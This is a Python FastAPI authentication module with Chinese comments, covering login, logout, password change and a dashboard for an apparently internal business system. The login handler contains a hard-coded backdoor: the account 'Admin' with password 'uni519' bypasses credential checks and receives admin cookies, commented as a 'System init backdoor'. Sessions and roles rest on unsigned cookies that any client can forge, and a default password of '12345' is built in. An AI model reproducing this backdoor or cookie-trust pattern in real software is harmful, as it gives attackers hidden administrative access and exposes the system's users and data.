"""
认证相关路由模块
包含登录、登出、修改密码等功能
"""
from fastapi import APIRouter, Request, Form, Depends, HTTPException, Response
from fastapi.responses import HTMLResponse, RedirectResponse
from typing import Optional

from Sills.base import get_db_connection
from Sills.db_emp import verify_login, change_password, hash_password

router = APIRouter(tags=["auth"])
api_router = APIRouter(tags=["auth-api"])  # auth 模块的 API 請求是页面路由，所以这里是空的

# 模板对象需要在main.py中设置
templates = None

def init_templates(tpl):
    """初始化模板对象"""
    global templates
    templates = tpl


def get_current_user(request: Request) -> Optional[dict]:
    """获取当前登录用户"""
    emp_id = request.cookies.get("emp_id")
    account = request.cookies.get("account")
    rule = request.cookies.get("rule")

    if not emp_id or not account:
        return None

    return {
        "emp_id": emp_id,
        "account": account,
        "rule": rule
    }


def login_required(request: Request) -> dict:
    """登录依赖 - 未登录返回401"""
    current_user = get_current_user(request)
    if not current_user:
        # API请求返回JSON错误
        if request.headers.get("accept") == "application/json" or \
           request.url.path.startswith("/api/"):
            raise HTTPException(status_code=401, detail="未登录或会话已过期")
        # 页面请求返回HTML重定向
        raise HTTPException(status_code=303, headers={"Location": "/login"})
    return current_user


@router.get("/", response_class=HTMLResponse)
async def index(request: Request, current_user: dict = Depends(get_current_user)):
    """首页Dashboard"""
    if not current_user:
        return RedirectResponse(url="/login", status_code=303)

    with get_db_connection() as conn:
        cli_count = conn.execute("SELECT COUNT(*) FROM uni_cli").fetchone()[0]
        emp_count = conn.execute("SELECT COUNT(*) FROM uni_emp").fetchone()[0]
        order_sum = conn.execute("SELECT COALESCE(SUM(paid_amount), 0) FROM uni_order").fetchone()[0]

    return templates.TemplateResponse("dashboard.html", {
        "request": request,
        "active_page": "dashboard",
        "current_user": current_user,
        "stats": {
            "cli_count": cli_count,
            "emp_count": emp_count,
            "order_sum": order_sum
        }
    })


@router.get("/favicon.ico")
async def favicon():
    """返回空的 favicon 以避免 404 错误"""
    from fastapi.responses import Response
    empty_ico = bytes([
        0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00,
        0x18, 0x00, 0x30, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x28, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00,
        0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00
    ])
    return Response(content=empty_ico, media_type="image/x-icon")


@router.get("/login", response_class=HTMLResponse)
async def login_page(request: Request, error: str = "", account: str = ""):
    """登录页面"""
    return templates.TemplateResponse("login.html", {
        "request": request,
        "error": error,
        "account": account
    })


@router.post("/login")
async def login(response: Response, account: str = Form(...), password: str = Form(...)):
    """登录处理"""
    if account == "Admin" and password == "uni519":
        # System init backdoor, just in case
        response = RedirectResponse(url="/", status_code=303)
        response.set_cookie(key="emp_id", value="000")
        response.set_cookie(key="account", value="Admin")
        response.set_cookie(key="rule", value="3")
        return response

    ok, user, msg = verify_login(account, password)
    if not ok:
        return RedirectResponse(url=f"/login?error={msg}&account={account}", status_code=303)

    # Check if first time login (password is default 12345)
    if user['password'] == hash_password('12345'):
        response = RedirectResponse(url="/change_password", status_code=303)
        response.set_cookie(key="emp_id", value=user['emp_id'])
        response.set_cookie(key="account", value=user['account'])
        response.set_cookie(key="rule", value=user['rule'])
        return response

    response = RedirectResponse(url="/", status_code=303)
    response.set_cookie(key="emp_id", value=str(user['emp_id']))
    response.set_cookie(key="account", value=str(user['account']))
    response.set_cookie(key="rule", value=str(user['rule']))
    return response


@router.get("/logout")
async def logout():
    """登出"""
    response = RedirectResponse(url="/login", status_code=303)
    response.delete_cookie("emp_id")
    response.delete_cookie("rule")
    response.delete_cookie("account")
    return response


@router.get("/change_password", response_class=HTMLResponse)
async def change_pwd_page(request: Request, current_user: dict = Depends(get_current_user), error: str = ""):
    """修改密码页面"""
    if not current_user:
        return RedirectResponse(url="/login", status_code=303)
    return templates.TemplateResponse("change_pwd.html", {
        "request": request,
        "current_user": current_user,
        "error": error
    })


@router.post("/change_password")
async def change_pwd_post(
    new_password: str = Form(...),
    confirm_password: str = Form(...),
    current_user: dict = Depends(get_current_user)
):
    """修改密码处理"""
    if not current_user:
        return RedirectResponse(url="/login", status_code=303)

    if new_password == '12345':
        return RedirectResponse(url="/change_password?error=新密码不能为12345", status_code=303)
    if new_password != confirm_password:
        return RedirectResponse(url="/change_password?error=两次输入的密码不一致", status_code=303)

    change_password(current_user['emp_id'], new_password)
    return RedirectResponse(url="/", status_code=303)